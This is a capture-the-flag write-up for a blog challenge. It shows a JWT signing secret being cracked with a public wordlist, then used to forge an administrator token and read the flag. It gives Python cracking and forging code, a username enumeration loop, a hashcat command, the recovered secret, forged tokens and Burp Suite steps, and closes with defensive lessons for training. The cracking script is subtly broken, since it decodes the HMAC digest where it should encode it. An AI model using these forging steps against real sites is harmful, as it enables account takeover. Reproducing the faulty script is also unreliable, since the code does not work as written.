# Blog Security CTF Challenge

### Quick Win Method

**Did we use all of those secrets?**
No, we didn't check every single one by hand. We used a **script** or **tool** (like `hashcat`) that checks them thousands of times per second.

The process, simplified:

1. **Get Token:** Log in and copy the token.
2. **Crack Secret:** The tool tries every word in the `jwt_secrets.txt` list until one matches the signature. In this case, it found the match (`16f237...`) almost instantly because it's in the list.
3. **Forge:** Once we have that secret key, we create a new token for user `administrator` and sign it with that key.
4. **Get Flag:** Send the new token to get the flag.

We only "used" the one correct secret key to sign our fake token. The rest were just failed attempts by the cracking tool.

---

**Challenge:** Blog Security  
**Points:** 650  
**URL:** <https://mnbvcxzasdfgh-csc26.cybersecuritychallenge.al>  
**Flag:** `CSC26{bl0g_s3cur1ty_fl4w}`

## Challenge Overview

A blog application with user registration, login, and profile functionality. The challenge required finding a security vulnerability to access the flag.

## Vulnerability

The application had **two critical vulnerabilities**:

1. **Weak JWT Secret** - The JWT tokens were signed with a weak secret that existed in common JWT secrets wordlists
2. **Insufficient Access Control** - Users could access any profile by forging JWT tokens with different usernames

## Solution Steps

### 1. Initial Reconnaissance

- Registered and logged in with credentials: `alpet123:alpet123`
- Observed that the application uses JWT tokens for authentication
- Profile page showed: "Welcome, alpet123!" with a default bio: "This is my bio."
- JWT structure: `{"alg":"HS256","typ":"JWT"}` with payload `{"username":"alpet123","iat":<timestamp>}`

### 2. Attack Vector Discovery

After testing various attack vectors (SQL injection, NoSQL injection, SSTI, prototype pollution, etc.), the successful approach was:

**JWT Secret Cracking**

### 3. JWT Secret Cracking

Downloaded a specialized JWT secrets wordlist:

```bash
curl https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list -o jwt_secrets.txt
```

Created a Python script to crack the JWT secret:

```python
import base64
import json
import requests
import hmac
import hashlib

# Load wordlist
with open("jwt_secrets.txt", "r", encoding="utf-8", errors="ignore") as f:
    secrets = [line.strip() for line in f if line.strip()]

# Get a valid token
s = requests.Session()
s.post(URL + "/login", data={"username": "alpet123", "password": "alpet123"})
token = s.cookies.get('token')

parts = token.split('.')
raw_msg = f"{parts[0]}.{parts[1]}"
target_sig = parts[2]

# Brute force the secret
for secret in secrets:
    sig = hmac.new(secret.encode('utf-8'), raw_msg.encode('utf-8'), hashlib.sha256).digest()
    if base64.urlsafe_b64decode(sig).decode().rstrip('=') == target_sig:
        print(f"Found: {secret}")
        break
```

**Result:** Found the secret in the wordlist (103,978 secrets tested):

```
16f237faf903a49a3e6b7a5261fc3ac4289ffb4634df4adbe07501469fd57c9c5a6b154a4fe3c5ed51fd21a31c1132d1e14a19f269b1851bb42cad005e4c26c7
```

### 4. JWT Token Forgery

With the secret, we can now forge JWT tokens for any user:

```python
def forge_token(username, secret, iat=1769776334):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": username, "iat": iat}

    def b64e(d):
        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')

    msg = f"{b64e(header)}.{b64e(payload)}"
    sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
    return f"{msg}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"
```

### 5. User Enumeration

Tested various usernames to find where the flag was hidden:

```python
usernames = ["admin", "flag", "root", "administrator", "csc26", ...]

for username in usernames:
    token = forge_token(username, JWT_SECRET)
    r = requests.get(URL + "/profile", cookies={"token": token})
    # Check bio content
```

**Result:** Found the flag in the `administrator` user's bio!

```
Welcome, administrator!
Bio: CSC26{bl0g_s3cur1ty_fl4w}
```

## Key Learnings

1. **Never use weak or common secrets for JWT signing** - Use cryptographically secure random secrets (at least 256 bits)
2. **Implement proper authorization** - Even with valid authentication, verify that users can only access their own resources
3. **User enumeration** - Don't assume the important user is named "admin" - try variations like "administrator", "root", etc.

## Flag

```
CSC26{bl0g_s3cur1ty_fl4w}
```

---

## Burp Suite Method

Yes! You can replicate this attack using **Burp Suite**. Here's how:

### Step 1: Capture Login Request

1. Configure your browser to use Burp as proxy (127.0.0.1:8080)
2. Navigate to the challenge URL and login with `alpet123:alpet123`
3. In Burp Proxy > HTTP history, find the POST request to `/login`
4. Send it to Repeater (Ctrl+R)

### Step 2: Extract JWT Token

1. In Repeater, send the login request
2. In the Response tab, look at the cookies - you'll see the `token` cookie
3. Copy the JWT token value (starts with `eyJ...`)

Example token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFscGV0MTIzIiwiaWF0IjoxNzY5Nzc2MzM0fQ.rMvKwW48ICSls9wcr_157Z1ZZf8H5U_PnNE4CMGRYK8
```

### Step 3: Crack JWT Secret with Burp Extension

**Option A: Using JWT Editor Extension**

1. Install **JWT Editor Keys** extension from BApp Store
2. Go to JWT Editor Keys tab
3. Click "New Symmetric Key"
4. Load the JWT secrets wordlist (jwt_secrets.txt)
5. Use the brute force feature

**Option B: Using hashcat (Recommended)**

1. Save your JWT token to a file: `token.txt`
2. Run hashcat:

```bash
hashcat -a 0 -m 16500 token.txt jwt_secrets.txt
```

Result: Secret is `16f237faf903a49a3e6b7a5261fc3ac4289ffb4634df4adbe07501469fd57c9c5a6b154a4fe3c5ed51fd21a31c1132d1e14a19f269b1851bb42cad005e4c26c7`

### Step 4: Forge Token in Burp

1. Install **JSON Web Tokens** extension from BApp Store
2. Capture a request to `/profile` in Burp Proxy
3. Send to Repeater
4. In Repeater, click on the JWT token in the cookie
5. The JWT Editor window will open
6. Click on the **payload** section
7. Change `"username":"alpet123"` to `"username":"administrator"`
8. Click on the **signature** section
9. Select "Sign" and paste the secret:
   ```
   16f237faf903a49a3e6b7a5261fc3ac4289ffb4634df4adbe07501469fd57c9c5a6b154a4fe3c5ed51fd21a31c1132d1e14a19f269b1851bb42cad005e4c26c7
   ```
10. Click "OK"

### Step 5: Send Forged Request

1. Send the modified request in Repeater
2. Check the Response - you should see:
   ```html
   <h2>Welcome, administrator!</h2>
   <p><strong>Bio:</strong> CSC26{bl0g_s3cur1ty_fl4w}</p>
   ```

### Alternative: Manual Token Forgery in Burp

You can also use Burp's **Decoder** tab:

1. **Create Header & Payload:**
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"username":"administrator","iat":1769776334}`

2. **Base64 Encode (URL-safe):**
   - Encode header → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
   - Encode payload → `eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJpYXQiOjE3Njk3NzYzMzR9`

3. **Generate HMAC-SHA256 Signature:**
   - Use an online tool or Python to sign with the secret
   - Or use Burp's JSON Web Tokens extension

4. **Combine:** `header.payload.signature`

5. **Replace the token cookie** in any request to `/profile` and send

### Burp Suite Extensions Needed

- **JSON Web Tokens** (JWT Editor)
- **JWT Editor Keys** (for key management)
- **Decoder** (built-in)

### Quick Burp Workflow Summary

```
1. Proxy → Capture login → Get JWT token
2. Use hashcat or JWT cracker to find secret
3. Repeater → Modify JWT payload (change username to "administrator")
4. JWT Editor → Sign with found secret
5. Send request → Get flag in response
```

---

**Author:** CTF Challenge Solution  
**Date:** January 30, 2026
